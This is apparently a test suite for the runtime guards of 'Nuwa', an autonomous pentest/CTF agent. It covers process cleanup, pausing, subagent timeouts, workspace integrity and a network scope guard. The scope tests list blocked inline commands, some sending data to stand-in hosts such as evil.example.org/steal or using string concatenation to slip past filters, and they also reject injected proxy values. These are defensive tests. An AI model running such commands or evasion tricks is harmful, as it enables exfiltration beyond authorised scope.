/**
 * 女娲 v5.1 运行时守卫专项测试（覆盖 GitHub Issues #40, #44, #46, #47, #48）。
 *
 * 覆盖清单：
 *   - #40 (NW-20): ProcessGroupTracker 与 cleanupTrackedProcesses 级联回收（含真实短命子进程组、SIGKILL 升级、安全护栏与信号清理）
 *   - #44 (NW-24): 软暂停 setPausedState / isPausedState 与 bin/nuwa-autonomous 优雅挂起/即时恢复
 *   - #46 (NW-26): SubagentWatchdog 心跳追踪、无输出空闲超时与硬超时终止、并发槽位释放
 *   - #47 (NW-27): 默认工作区迁出 /tmp、/tmp 结构化告警与 verifyWorkspaceIntegrity (.git 丢失检测)
 *   - #48 (NW-28): 跨运行时网络边界策略（python/node/bun/ruby/perl/php 内联脚本越界拦截、buildUnifiedNetworkEnv、gh 短超时、[layer=...] 标签）
 */
import { afterAll, afterEach, describe, expect, test } from "bun:test";
import { spawn, spawnSync } from "node:child_process";
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import {
	DEFAULT_SUBAGENT_HARD_TIMEOUT_MS,
	DEFAULT_SUBAGENT_IDLE_TIMEOUT_MS,
	ProcessGroupTracker,
	SubagentWatchdog,
	checkWorkspaceTempWarning,
	cleanupTrackedProcesses,
	defaultProjectRoot,
	isPausedState,
	isProcessAliveNonZombie,
	isSharedCwd,
	isVolatileTempPath,
	pidAlive,
	readPausedState,
	resolveDefaultWorkspacesDir,
	resolvePersistentStateDir,
	setPausedState,
	verifyWorkspaceIntegrity,
} from "../omp/storage";
import {
	buildUnifiedNetworkEnv,
	checkScopeAndRisk,
	checkToolScopeAndRisk,
	defaultScopeForTarget,
	extractCommandTargets,
	extractInlineScriptTargets,
	formatScopeBlockReason,
} from "../omp/scope";

const REPO_ROOT = resolve(import.meta.dir, "..");
const DAEMON_BIN = join(REPO_ROOT, "bin", "nuwa-autonomous");

const SUITE_AGENT_HOME = mkdtempSync(join(tmpdir(), "nuwa-v51-rt-home-"));
const origEnv = {
	PI_AGENT_HOME: process.env.PI_AGENT_HOME,
	NUWA_STATE_DIR: process.env.NUWA_STATE_DIR,
	NUWA_WORKSPACES_DIR: process.env.NUWA_WORKSPACES_DIR,
	NUWA_ALLOW_TMP_WORKSPACE: process.env.NUWA_ALLOW_TMP_WORKSPACE,
};
process.env.PI_AGENT_HOME = SUITE_AGENT_HOME;

const tmpDirs: string[] = [];
const spawnedPids: number[] = [];

function makeTmpDir(prefix = "nuwa-v51-rt-"): string {
	const d = mkdtempSync(join(tmpdir(), prefix));
	tmpDirs.push(d);
	return d;
}

function spawnDetachedShell(script: string): { pid: number; child: ReturnType<typeof spawn> } {
	const child = spawn("sh", ["-c", script], {
		detached: true,
		stdio: "ignore",
	});
	if (!child.pid) throw new Error("failed to spawn test shell");
	spawnedPids.push(child.pid);
	child.unref();
	return { pid: child.pid, child };
}

function cleanEnv(extra: Record<string, string | undefined> = {}): Record<string, string> {
	const out: Record<string, string> = {};
	for (const [k, v] of Object.entries(process.env)) {
		if (k === "BUN_OPTIONS" || v === undefined) continue;
		out[k] = v;
	}
	for (const [k, v] of Object.entries(extra)) {
		if (v === undefined) delete out[k];
		else out[k] = v;
	}
	return out;
}

afterEach(() => {
	while (spawnedPids.length > 0) {
		const pid = spawnedPids.pop()!;
		try {
			process.kill(-pid, "SIGKILL");
		} catch {
			try {
				process.kill(pid, "SIGKILL");
			} catch {
				/* already dead */
			}
		}
	}
	while (tmpDirs.length > 0) {
		const d = tmpDirs.pop()!;
		try {
			rmSync(d, { recursive: true, force: true });
		} catch {
			/* ignore */
		}
	}
	if (origEnv.NUWA_STATE_DIR === undefined) delete process.env.NUWA_STATE_DIR;
	else process.env.NUWA_STATE_DIR = origEnv.NUWA_STATE_DIR;
	if (origEnv.NUWA_WORKSPACES_DIR === undefined) delete process.env.NUWA_WORKSPACES_DIR;
	else process.env.NUWA_WORKSPACES_DIR = origEnv.NUWA_WORKSPACES_DIR;
	if (origEnv.NUWA_ALLOW_TMP_WORKSPACE === undefined) delete process.env.NUWA_ALLOW_TMP_WORKSPACE;
	else process.env.NUWA_ALLOW_TMP_WORKSPACE = origEnv.NUWA_ALLOW_TMP_WORKSPACE;
	process.env.PI_AGENT_HOME = SUITE_AGENT_HOME;
});

afterAll(() => {
	rmSync(SUITE_AGENT_HOME, { recursive: true, force: true });
	if (origEnv.PI_AGENT_HOME === undefined) delete process.env.PI_AGENT_HOME;
	else process.env.PI_AGENT_HOME = origEnv.PI_AGENT_HOME;
});

describe("Issue #40 (NW-20): ProcessGroupTracker 与 cleanupTrackedProcesses 级联回收", () => {
	test("按 -pgid 级联回收真实短命子进程组（含孙子进程）并在忽略 SIGTERM 时升级 SIGKILL", async () => {
		const root = makeTmpDir("nuwa-i40-pg-");
		const tracker = new ProcessGroupTracker(root);
		const grandPidFile = join(root, "grandchild.pid");

		// 1. 常规可响应 SIGTERM 的进程组（模拟 chromeproxy + 派生孙子进程）
		const normalProc = spawnDetachedShell(`sleep 30 & echo $! > "${grandPidFile}"; wait`);
		// 等待孙子进程 PID 落盘
		const waitDeadline = Date.now() + 2000;
		while (!existsSync(grandPidFile) && Date.now() < waitDeadline) {
			await Bun.sleep(20);
		}
		const grandPid = Number(readFileSync(grandPidFile, "utf8").trim());
		expect(grandPid).toBeGreaterThan(1);
		expect(isProcessAliveNonZombie(normalProc.pid)).toBe(true);
		expect(isProcessAliveNonZombie(grandPid)).toBe(true);

		const rec1 = tracker.register({
			pid: normalProc.pid,
			pgid: normalProc.pid,
			label: "chromeproxy",
			taskId: "task-browser-1",
			command: "chromeproxy --port 9222",
		});
		expect(rec1.pgid).toBe(normalProc.pid);

		// 2. 忽略 SIGTERM 的顽固进程组（测试宽限期满升级 SIGKILL）
		const stubbornProc = spawnDetachedShell("trap '' TERM; sleep 30 & wait");
		await Bun.sleep(60);
		expect(isProcessAliveNonZombie(stubbornProc.pid)).toBe(true);
		tracker.register({
			pid: stubbornProc.pid,
			pgid: stubbornProc.pid,
			label: "chromium",
			taskId: "task-browser-2",
		});

		// 3. 仅按 taskId 定向回收 task-browser-1，不影响 task-browser-2
		const res1 = cleanupTrackedProcesses(root, { taskId: "task-browser-1", graceMs: 1200, reason: "cancel_task_1" });
		expect(res1.ok).toBe(true);
		expect(res1.cleaned.length).toBe(1);
		expect(res1.cleaned[0]?.pid).toBe(normalProc.pid);
		expect(res1.cleaned[0]?.groupKilled).toBe(true);
		expect(res1.cleaned[0]?.signal).toBe("SIGTERM");
		expect(res1.remaining.map((r) => r.pid)).toEqual([stubbornProc.pid]);

		await Bun.sleep(60);
		expect(isProcessAliveNonZombie(normalProc.pid)).toBe(false);
		expect(isProcessAliveNonZombie(grandPid)).toBe(false);
		expect(isProcessAliveNonZombie(stubbornProc.pid)).toBe(true);

		// 4. 全量清理顽固进程组：120ms 宽限期满后升级 SIGKILL 强杀
		const res2 = cleanupTrackedProcesses(root, { graceMs: 120, pollMs: 20, reason: "nuwa_stop" });
		expect(res2.ok).toBe(true);
		expect(res2.cleaned.length).toBe(1);
		expect(res2.cleaned[0]?.pid).toBe(stubbornProc.pid);
		expect(res2.cleaned[0]?.signal).toBe("SIGKILL");
		expect(res2.cleaned[0]?.groupKilled).toBe(true);
		expect(res2.remaining).toEqual([]);

		await Bun.sleep(80);
		expect(isProcessAliveNonZombie(stubbornProc.pid)).toBe(false);
	});

	test("安全红线：严禁登记或向 <= 1、当前进程 PID/PPID/PGID 发送任何信号", () => {
		const root = makeTmpDir("nuwa-i40-safe-");
		const tracker = new ProcessGroupTracker(root);

		expect(() => tracker.register({ pid: 0, label: "bad" })).toThrow();
		expect(() => tracker.register({ pid: -5, label: "bad" })).toThrow();
		expect(() => tracker.register({ pid: 1, label: "init" })).toThrow();
		expect(() => tracker.register({ pid: process.pid, label: "self" })).toThrow();

		// 即使磁盘文件被人为篡改写入危险 PID/PGID，cleanup 必须全部跳过且宿主毫发无损
		mkdirSync(join(root, ".nuwa"), { recursive: true });
		writeFileSync(
			tracker.filePath(),
			JSON.stringify({
				schema: 1,
				updatedAt: new Date().toISOString(),
				records: [
					{ pid: 0, pgid: 0, label: "zero", startedAt: new Date().toISOString(), startedAtMs: Date.now(), ownerPid: 1 },
					{ pid: -1, pgid: -1, label: "neg", startedAt: new Date().toISOString(), startedAtMs: Date.now(), ownerPid: 1 },
					{ pid: 1, pgid: 1, label: "init", startedAt: new Date().toISOString(), startedAtMs: Date.now(), ownerPid: 1 },
					{
						pid: process.pid,
						pgid: process.pid,
						label: "self",
						startedAt: new Date().toISOString(),
						startedAtMs: Date.now(),
						ownerPid: process.pid,
					},
				],
			}),
			"utf8",
		);

		const res = cleanupTrackedProcesses(root, { graceMs: 50 });
		expect(res.ok).toBe(true);
		expect(res.skippedUnsafe).toBe(4);
		expect(res.cleaned.every((c) => c.signal === "skipped_unsafe")).toBe(true);
		expect(pidAlive(process.pid)).toBe(true);
	});

	test("bin/nuwa-autonomous 收到 SIGHUP/SIGTERM 信号时级联清理登记的孤儿子进程组", async () => {
		const work = makeTmpDir("nuwa-i40-daemon-sig-");
		const projRoot = join(work, "proj");
		mkdirSync(projRoot, { recursive: true });

		// 预先模拟一个由子代理遗留的 chromeproxy 后台进程组
		const orphan = spawnDetachedShell("sleep 30");
		const tracker = new ProcessGroupTracker(projRoot);
		tracker.register({ pid: orphan.pid, pgid: orphan.pid, label: "chromeproxy", taskId: "orphan-1" });
		expect(isProcessAliveNonZombie(orphan.pid)).toBe(true);

		const fakeOmp = join(work, "fake-omp.sh");
		writeFileSync(fakeOmp, "#!/usr/bin/env bash\nexec sleep 30\n", "utf8");
		chmodSync(fakeOmp, 0o755);

		const daemon = Bun.spawn(
			[DAEMON_BIN, "--target", "http://127.0.0.1:18401", "--root", projRoot, "--omp-bin", fakeOmp, "--max-generations", "1"],
			{
				env: cleanEnv({ NUWA_ALLOW_TMP_WORKSPACE: "1", NUWA_DAEMON_BACKOFF_MS: "20" }),
				stdin: "ignore",
				stdout: "pipe",
				stderr: "pipe",
			},
		);

		const waitStart = Date.now();
		while (tracker.list().length < 2 && Date.now() - waitStart < 3000) {
			await Bun.sleep(40);
		}
		daemon.kill("SIGHUP");
		const exitCode = await daemon.exited;
		expect(exitCode).toBe(129);

		const deadWait = Date.now();
		while (isProcessAliveNonZombie(orphan.pid) && Date.now() - deadWait < 1500) {
			await Bun.sleep(40);
		}
		expect(isProcessAliveNonZombie(orphan.pid)).toBe(false);
	});
});

describe("Issue #44 (NW-24): 软暂停 setPausedState / isPausedState 与守护器优雅挂起/即时恢复", () => {
	test("setPausedState / isPausedState / readPausedState 原子读写与 journal 审计", () => {
		const root = makeTmpDir("nuwa-i44-unit-");
		expect(isPausedState(root)).toBe(false);
		expect(readPausedState(root)).toBeNull();

		const p1 = setPausedState(root, true, "人工介入排查出口代理");
		expect(p1.paused).toBe(true);
		expect(p1.reason).toContain("人工介入排查出口代理");
		expect(isPausedState(root)).toBe(true);
		expect(readPausedState(root)?.pausedAt).toBeDefined();

		const p2 = setPausedState(root, false, "代理已恢复，继续推进");
		expect(p2.paused).toBe(false);
		expect(isPausedState(root)).toBe(false);
		expect(readPausedState(root)?.resumedAt).toBeDefined();

		const journal = readFileSync(join(root, ".nuwa", "journal.jsonl"), "utf8");
		expect(journal).toContain('"type":"pause_enabled"');
		expect(journal).toContain('"type":"pause_resumed"');
	});

	test("bin/nuwa-autonomous 检测到软暂停标记时优雅挂起而非强停，解除后即时恢复并完成任务", async () => {
		const work = makeTmpDir("nuwa-i44-daemon-");
		const projRoot = join(work, "proj");
		mkdirSync(projRoot, { recursive: true });
		const ranFlag = join(work, "omp-ran.txt");
		const fakeOmp = join(work, "omp-complete.py");

		writeFileSync(
			fakeOmp,
			`#!/usr/bin/env python3
import json, os, pathlib, sys
root = pathlib.Path(os.environ["NUWA_PROJECT"])
(root / ".nuwa").mkdir(parents=True, exist_ok=True)
pathlib.Path(${JSON.stringify(ranFlag)}).write_text("ran", encoding="utf-8")
st = {
    "schema": 1,
    "version": "5.0.0",
    "project": {
        "id": "pause-demo",
        "target": "http://127.0.0.1:18440",
        "url": "http://127.0.0.1:18440",
        "host": "127.0.0.1",
        "port": 18440,
        "scheme": "http",
        "goal": "暂停恢复测试",
        "mode": "ctf",
        "status": "completed",
        "phase": "report",
    },
    "facts": {"f001": {"id": "f001", "kind": "flag", "title": "flag", "detail": "flag{resumed-ok}"}},
    "intents": {},
    "seq": {"fact": 1, "intent": 0},
    "runtime": {"generation": 1},
}
(root / ".nuwa" / "state.json").write_text(json.dumps(st), encoding="utf-8")
sys.exit(0)
`,
			"utf8",
		);
		chmodSync(fakeOmp, 0o755);

		// 先设置软暂停
		setPausedState(projRoot, true, "等待操作者人工核验");

		const daemon = Bun.spawn(
			[DAEMON_BIN, "--target", "http://127.0.0.1:18440", "--root", projRoot, "--omp-bin", fakeOmp, "--max-generations", "2"],
			{
				env: cleanEnv({ NUWA_ALLOW_TMP_WORKSPACE: "1", NUWA_PAUSE_POLL_MS: "30" }),
				stdin: "ignore",
				stdout: "pipe",
				stderr: "pipe",
			},
		);

		// 挂起期间不得强停也不得拉起 omp
		await Bun.sleep(260);
		expect(existsSync(ranFlag)).toBe(false);
		expect(daemon.exitCode).toBeNull();

		// 即时解除暂停
		setPausedState(projRoot, false, "核验完成，恢复运行");
		const code = await daemon.exited;
		const stdout = await new Response(daemon.stdout).text();
		expect(code).toBe(0);
		expect(existsSync(ranFlag)).toBe(true);
		expect(stdout).toContain("优雅挂起");
		expect(stdout).toContain("立即恢复执行");
		expect(stdout).toContain("任务已完成");
	});
});

describe("Issue #46 (NW-26): SubagentWatchdog 子代理心跳与超时看门狗", () => {
	test("默认阈值为 300s/900s；无输出空闲超时与单任务硬超时均联动终止进程组、标为 timeout 并释放并发槽位", async () => {
		const root = makeTmpDir("nuwa-i46-wd-");
		const defaultWd = new SubagentWatchdog(root);
		expect(defaultWd.idleTimeoutMs).toBe(DEFAULT_SUBAGENT_IDLE_TIMEOUT_MS);
		expect(defaultWd.hardTimeoutMs).toBe(DEFAULT_SUBAGENT_HARD_TIMEOUT_MS);
		expect(defaultWd.idleTimeoutMs).toBe(300_000);
		expect(defaultWd.hardTimeoutMs).toBe(900_000);

		const wd = new SubagentWatchdog(root, {
			idleTimeoutMs: 300_000,
			hardTimeoutMs: 900_000,
			maxConcurrency: 2,
			cleanupGraceMs: 120,
		});
		expect(wd.availableSlots()).toBe(2);

		const t0 = 1_700_000_000_000;
		const procIdle = spawnDetachedShell("sleep 30");
		const procHard = spawnDetachedShell("sleep 30");
		expect(isProcessAliveNonZombie(procIdle.pid)).toBe(true);
		expect(isProcessAliveNonZombie(procHard.pid)).toBe(true);

		wd.startTask({
			taskId: "sub-idle-1",
			agent: "fujiang",
			intentId: "i101",
			pid: procIdle.pid,
			pgid: procIdle.pid,
			nowMs: t0,
		});
		wd.startTask({
			taskId: "sub-hard-2",
			agent: "fujiang",
			intentId: "i102",
			pid: procHard.pid,
			pgid: procHard.pid,
			nowMs: t0,
		});
		expect(wd.activeCount()).toBe(2);
		expect(wd.availableSlots()).toBe(0);

		// sub-idle-1 仅发请求心跳（hasOutput=false），无实际输出；sub-hard-2 持续产生输出
		wd.recordRequest("sub-idle-1", t0 + 250_000);
		wd.recordOutput("sub-hard-2", t0 + 250_000);
		expect(wd.getTask("sub-idle-1")?.lastReqAt).toBe(t0 + 250_000);
		expect(wd.getTask("sub-idle-1")?.lastOutputAt).toBe(t0);

		// t0 + 305s：sub-idle-1 触发无输出空闲超时，sub-hard-2 保持运行
		const sweep1 = wd.checkTimeouts(t0 + 305_000, { graceMs: 120 });
		expect(sweep1.timedOut.length).toBe(1);
		expect(sweep1.timedOut[0]?.taskId).toBe("sub-idle-1");
		expect(sweep1.timedOut[0]?.timeoutKind).toBe("idle_no_output");
		expect(sweep1.runningCount).toBe(1);
		expect(sweep1.availableSlots).toBe(1);
		expect(wd.getTask("sub-idle-1")?.status).toBe("timeout");
		expect(wd.getTask("sub-hard-2")?.status).toBe("running");

		await Bun.sleep(80);
		expect(isProcessAliveNonZombie(procIdle.pid)).toBe(false);
		expect(isProcessAliveNonZombie(procHard.pid)).toBe(true);

		// sub-hard-2 继续持续输出，但到 t0 + 905s 触发单任务硬超时
		wd.recordOutput("sub-hard-2", t0 + 880_000);
		const sweep2 = wd.checkTimeouts(t0 + 905_000, { graceMs: 120 });
		expect(sweep2.timedOut.length).toBe(1);
		expect(sweep2.timedOut[0]?.taskId).toBe("sub-hard-2");
		expect(sweep2.timedOut[0]?.timeoutKind).toBe("hard_timeout");
		expect(sweep2.runningCount).toBe(0);
		expect(sweep2.availableSlots).toBe(2);
		expect(wd.getTask("sub-hard-2")?.status).toBe("timeout");

		await Bun.sleep(80);
		expect(isProcessAliveNonZombie(procHard.pid)).toBe(false);

		const journal = readFileSync(join(root, ".nuwa", "journal.jsonl"), "utf8");
		expect(journal).toContain('"type":"subagent_timeout"');
		expect(journal).toContain('"timeoutKind":"idle_no_output"');
		expect(journal).toContain('"timeoutKind":"hard_timeout"');
	});
});

describe("Issue #47 (NW-27): 迁出 /tmp 持久化工作区、结构化警告与 verifyWorkspaceIntegrity", () => {
	test("持久化默认目录迁出 /tmp，支持 NUWA_STATE_DIR，/tmp 警告单测安全且可强制检验", () => {
		const persistBase = makeTmpDir("nuwa-i47-state-");
		// 显式指定 NUWA_STATE_DIR 优先
		expect(resolvePersistentStateDir({ NUWA_STATE_DIR: persistBase })).toBe(resolve(persistBase));
		expect(resolveDefaultWorkspacesDir({ NUWA_STATE_DIR: persistBase })).toBe(join(resolve(persistBase), "workspaces"));
		// 缺省落在 ~/.local/state/nuwa（非 /tmp）
		const defaultState = resolvePersistentStateDir({});
		expect(defaultState.endsWith(join(".local", "state", "nuwa"))).toBe(true);
		expect(isVolatileTempPath(defaultState)).toBe(false);

		// /tmp 与 os.tmpdir() 判定
		expect(isSharedCwd("/tmp")).toBe(true);
		expect(isVolatileTempPath("/tmp/nuwa-study")).toBe(true);
		expect(isVolatileTempPath(join(tmpdir(), "ephemeral-proj"))).toBe(true);

		// 设 NUWA_STATE_DIR 后 defaultProjectRoot 在 /tmp 下自动迁出至 $NUWA_STATE_DIR/workspaces
		process.env.NUWA_STATE_DIR = persistBase;
		const routed = defaultProjectRoot("/tmp", "http://rggo5269.com:80", "sess-i47");
		expect(resolve(routed).startsWith(join(resolve(persistBase), "workspaces"))).toBe(true);

		// /tmp 结构化警告：单测环境静默返回 null；forceCheck=true 时返回结构化 NUWA_VOLATILE_TMP_WORKSPACE
		expect(checkWorkspaceTempWarning("/tmp/nuwa-study", { allowTmp: true, forceCheck: true })).toBeNull();
		const warn = checkWorkspaceTempWarning("/tmp/nuwa-study", { forceCheck: true, env: { NUWA_STATE_DIR: persistBase } });
		expect(warn?.code).toBe("NUWA_VOLATILE_TMP_WORKSPACE");
		expect(warn?.severity).toBe("warn");
		expect(warn?.suggestedRoot).toBe(join(resolve(persistBase), "workspaces"));
	});

	test("verifyWorkspaceIntegrity 启动记录 .git 基线并在 .git 或目录丢失时返回明确告警状态", () => {
		const ws = makeTmpDir("nuwa-i47-git-");
		mkdirSync(join(ws, ".nuwa"), { recursive: true });
		mkdirSync(join(ws, ".git"), { recursive: true });
		writeFileSync(join(ws, ".git", "HEAD"), "ref: refs/heads/main\n", "utf8");

		// 1. 启动基线校验：.git 完好
		const okReport = verifyWorkspaceIntegrity(ws, { recordBaseline: true, allowTmp: true });
		expect(okReport.ok).toBe(true);
		expect(okReport.status).toBe("ok");
		expect(okReport.gitExpected).toBe(true);
		expect(okReport.gitPresent).toBe(true);
		expect(okReport.gitHeadValid).toBe(true);

		// 2. 模拟运行期 .git 丢失（复现 NW-27 现场）
		rmSync(join(ws, ".git"), { recursive: true, force: true });
		const gitLost = verifyWorkspaceIntegrity(ws, { allowTmp: true });
		expect(gitLost.ok).toBe(false);
		expect(gitLost.status).toBe("corrupted");
		expect(gitLost.gitExpected).toBe(true);
		expect(gitLost.gitPresent).toBe(false);
		expect(gitLost.warnings.some((w) => w.code === "NUWA_GIT_METADATA_MISSING")).toBe(true);

		// 3. 模拟目录被整块清除
		const goneDir = join(ws, "removed-subdir");
		const missingReport = verifyWorkspaceIntegrity(goneDir, { allowTmp: true });
		expect(missingReport.ok).toBe(false);
		expect(missingReport.status).toBe("corrupted");
		expect(missingReport.exists).toBe(false);
		expect(missingReport.warnings.some((w) => w.code === "NUWA_WORKSPACE_MISSING")).toBe(true);
	});

	test("bin/nuwa-autonomous 未传 --root 且位于 /tmp 时自动迁出；运行期 .git 丢失时结算即刻告警", () => {
		const stateDir = makeTmpDir("nuwa-i47-daemon-state-");
		// 1. cwd=/tmp 且未传 --root，dry-run 应自动将工作区迁出 /tmp
		const dryRes = spawnSync(
			DAEMON_BIN,
			["--target", "http://rggo5269.com:80", "--dry-run"],
			{
				cwd: "/tmp",
				encoding: "utf8",
				timeout: 10_000,
				env: cleanEnv({ NUWA_STATE_DIR: stateDir }),
			},
		);
		expect(dryRes.status).toBe(0);
		expect(dryRes.stdout).toContain(join(resolve(stateDir), "workspaces"));

		// 2. 运行期 .git 被删除：启动记录基线 -> 第 1 代删除 .git 并完成 -> 结算校验检出 NUWA_GIT_METADATA_MISSING
		const work = makeTmpDir("nuwa-i47-gitloss-");
		const projRoot = join(work, "repo");
		mkdirSync(join(projRoot, ".git"), { recursive: true });
		writeFileSync(join(projRoot, ".git", "HEAD"), "ref: refs/heads/main\n", "utf8");
		const stub = join(work, "omp-drop-git.py");
		writeFileSync(
			stub,
			`#!/usr/bin/env python3
import json, os, pathlib, shutil, sys
root = pathlib.Path(os.environ["NUWA_PROJECT"])
shutil.rmtree(root / ".git", ignore_errors=True)
(root / ".nuwa").mkdir(parents=True, exist_ok=True)
st = {
    "schema": 1, "version": "5.0.0",
    "project": {"id": "gitloss", "target": "http://127.0.0.1:18470", "url": "http://127.0.0.1:18470", "host": "127.0.0.1", "port": 18470, "scheme": "http", "goal": "g", "mode": "ctf", "status": "completed", "phase": "report"},
    "facts": {}, "intents": {}, "seq": {"fact": 0, "intent": 0}, "runtime": {"generation": 1},
}
(root / ".nuwa" / "state.json").write_text(json.dumps(st), encoding="utf-8")
sys.exit(0)
`,
			"utf8",
		);
		chmodSync(stub, 0o755);

		const runRes = spawnSync(
			DAEMON_BIN,
			["--target", "http://127.0.0.1:18470", "--root", projRoot, "--omp-bin", stub, "--max-generations", "1"],
			{
				encoding: "utf8",
				timeout: 10_000,
				env: cleanEnv({ NUWA_ALLOW_TMP_WORKSPACE: "1" }),
			},
		);
		expect(runRes.status).toBe(0);
		expect(runRes.stderr).toContain("NUWA_GIT_METADATA_MISSING");
	});
});

describe("Issue #48 (NW-28): 跨运行时网络边界策略、内联脚本拦截、统一代理环境与 [layer=...] 标签", () => {
	test("严格拦截 python/node/bun/ruby/perl/php 内联脚本越界 URL/域名与拼接绕过，同时放行同源白名单与常规代码属性", () => {
		const scope = defaultScopeForTarget("http://target.example.test:8080", "pentest");

		// 1. 全部 6 种解释器的越界访问（含直连、字符串拼接、网络 API 裸域名、heredoc 与管道）必须拦截
		const blockedCmds = [
			`python -c "import urllib.request; urllib.request.urlopen('https://api.github.com/zen')"`,
			`python3 -c "import urllib.request; urllib.request.urlopen('https://' + 'api.github.com/repos')"`,
			`python3 -c "import http.client; http.client.HTTPSConnection('api.github.com')"`,
			`node -e "fetch('https://api.github.com/user')"`,
			`node -e "fetch('https://' + 'evil.example.org/steal')"`,
			`node -e "require('https').get({ hostname: 'api.github.com', path: '/' })"`,
			`node --eval="require('net').connect(443, 'evil.example.org')"`,
			`bun -e "await fetch('https://evil.example.org/p')"`,
			`ruby -e "require 'net/http'; Net::HTTP.get('api.github.com', '/')"`,
			`perl -e "use IO::Socket::INET; IO::Socket::INET->new(PeerAddr => 'evil.example.org:443')"`,
			`php -r "echo file_get_contents('https://api.github.com');"`,
			`php -r "fsockopen('evil.example.org', 80);"`,
			`echo "import urllib.request; urllib.request.urlopen('https://api.github.com')" | python3`,
			`python3 - <<'EOF'\nimport urllib.request\nurllib.request.urlopen("https://" + "api.github.com")\nEOF`,
		];

		for (const cmd of blockedCmds) {
			const v = checkScopeAndRisk(cmd, scope, "pentest");
			expect(v?.block).toBe(true);
			expect(v?.reason).toContain("nuwa N-007");
			expect(v?.reason).toContain("[layer=shell-guard]");
		}

		// 2. 同源白名单内的内联脚本必须放行
		const allowedCmds = [
			`python3 -c "import urllib.request; urllib.request.urlopen('http://target.example.test:8080/health')"`,
			`node -e "fetch('http://target.example.test:8080/api/v1')"`,
			`bun -e "await fetch('http://target.example.test:8080/')"`,
			`ruby -e "require 'net/http'; Net::HTTP.get('target.example.test', '/')"`,
			`php -r "file_get_contents('http://target.example.test:8080/');"`,
			// 无害非网络属性访问绝不误报
			`python3 -c "import logging; f = logging.info"`,
			`python3 -c "from myapp.app import main"`,
		];
		for (const cmd of allowedCmds) {
			expect(checkScopeAndRisk(cmd, scope, "pentest")).toBeNull();
		}

		expect(extractInlineScriptTargets(`fetch("https://" + "api.github.com/v1")`)).toContain("api.github.com");
		expect(extractCommandTargets(`python3 -c "import urllib.request; urllib.request.urlopen('https://api.github.com')"`)).toContain(
			"api.github.com",
		);
	});

	test("所有 N-007 阻断消息显式标明执行拦截层 [layer=shell-guard] / [layer=egress-proxy] / [layer=sandbox-net]", () => {
		const scope = defaultScopeForTarget("http://target.example.test:8080", "pentest");

		const bashBlock = checkToolScopeAndRisk("bash", { command: "curl -sS https://api.github.com" }, scope, "pentest");
		expect(bashBlock?.block).toBe(true);
		expect(bashBlock?.reason).toContain("[layer=shell-guard]");

		const sandboxBlock = checkScopeAndRisk("curl -sS https://api.github.com", scope, "pentest", { layer: "sandbox-net" });
		expect(sandboxBlock?.block).toBe(true);
		expect(sandboxBlock?.reason).toContain("[layer=sandbox-net]");

		const readBlock = checkToolScopeAndRisk("read", { path: "https://api.github.com/repos" }, scope, "pentest");
		expect(readBlock?.block).toBe(true);
		expect(readBlock?.reason).toContain("[layer=egress-proxy]");

		const browserBlock = checkToolScopeAndRisk("browser", { url: "https://evil.example.org" }, scope, "pentest");
		expect(browserBlock?.block).toBe(true);
		expect(browserBlock?.reason).toContain("[layer=egress-proxy]");

		const evalBlock = checkToolScopeAndRisk("eval", { code: `fetch("https://" + "api.github.com")` }, scope, "pentest");
		expect(evalBlock?.block).toBe(true);
		expect(evalBlock?.reason).toContain("[layer=shell-guard]");

		expect(formatScopeBlockReason("egress-proxy", "测试越界")).toBe("nuwa N-007 [layer=egress-proxy]: 测试越界");
		expect(formatScopeBlockReason("sandbox-net", "容器拦截")).toBe("nuwa N-007 [layer=sandbox-net]: 容器拦截");
	});

	test("buildUnifiedNetworkEnv 统一代理与 NO_PROXY 环境变量，并校验非法 egressUrl", () => {
		const envHttp = buildUnifiedNetworkEnv("http://127.0.0.1:7890", ["target.example.test", "API.TARGET.TEST"]);
		expect(envHttp.HTTP_PROXY).toBe("http://127.0.0.1:7890");
		expect(envHttp.http_proxy).toBe("http://127.0.0.1:7890");
		expect(envHttp.HTTPS_PROXY).toBe("http://127.0.0.1:7890");
		expect(envHttp.https_proxy).toBe("http://127.0.0.1:7890");
		expect(envHttp.NO_PROXY).toContain("127.0.0.1");
		expect(envHttp.NO_PROXY).toContain("localhost");
		expect(envHttp.no_proxy).toBe(envHttp.NO_PROXY);
		expect(envHttp.NUWA_SCOPE_ALLOW_HOSTS).toBe("target.example.test,api.target.test");
		expect(envHttp.GH_HTTP_TIMEOUT).toBe("5");

		const envSocks = buildUnifiedNetworkEnv("socks5h://127.0.0.1:7890", ["rggo5269.com"], {
			extraNoProxy: ["internal.local"],
			ghHttpTimeoutSec: 3,
		});
		expect(envSocks.ALL_PROXY).toBe("socks5h://127.0.0.1:7890");
		expect(envSocks.all_proxy).toBe("socks5h://127.0.0.1:7890");
		expect(envSocks.NO_PROXY).toContain("internal.local");
		expect(envSocks.GH_HTTP_TIMEOUT).toBe("3");

		expect(() => buildUnifiedNetworkEnv("http://127.0.0.1:7890\nINJECT=1", [])).toThrow();
		expect(() => buildUnifiedNetworkEnv("file:///etc/passwd", [])).toThrow();
	});

	test("bin/nuwa-autonomous 对 gh 等外部探活命令施加短超时保护（GH_HTTP_TIMEOUT=5 / timeout），绝不挂死", () => {
		const work = makeTmpDir("nuwa-i48-gh-");
		const fakeGh = join(work, "fake-gh");
		writeFileSync(fakeGh, "#!/usr/bin/env bash\nexec sleep 30\n", "utf8");
		chmodSync(fakeGh, 0o755);

		const t0 = Date.now();
		const docRes = spawnSync(
			DAEMON_BIN,
			["doctor", "--json", "--gh-bin", fakeGh],
			{
				encoding: "utf8",
				timeout: 10_000,
				env: cleanEnv({ NUWA_EXTERNAL_PROBE_TIMEOUT_MS: "200" }),
			},
		);
		const elapsed = Date.now() - t0;
		expect(elapsed).toBeLessThan(3000);
		const payload = JSON.parse(docRes.stdout.trim());
		expect(payload.checks.gh.timedOut).toBe(true);
		expect(payload.checks.gh.ghHttpTimeoutSec).toBe(5);

		// dry-run 校验统一代理环境变量与 GH_HTTP_TIMEOUT 透传
		const dryRes = spawnSync(
			DAEMON_BIN,
			["--target", "http://rggo5269.com:80", "--root", work, "--egress-proxy", "http://127.0.0.1:7890", "--dry-run"],
			{
				encoding: "utf8",
				timeout: 10_000,
				env: cleanEnv(),
			},
		);
		expect(dryRes.status).toBe(0);
		expect(dryRes.stdout).toContain('"HTTP_PROXY": "http://127.0.0.1:7890"');
		expect(dryRes.stdout).toContain('"HTTPS_PROXY": "http://127.0.0.1:7890"');
		expect(dryRes.stdout).toContain('"GH_HTTP_TIMEOUT": "5"');
	});
});
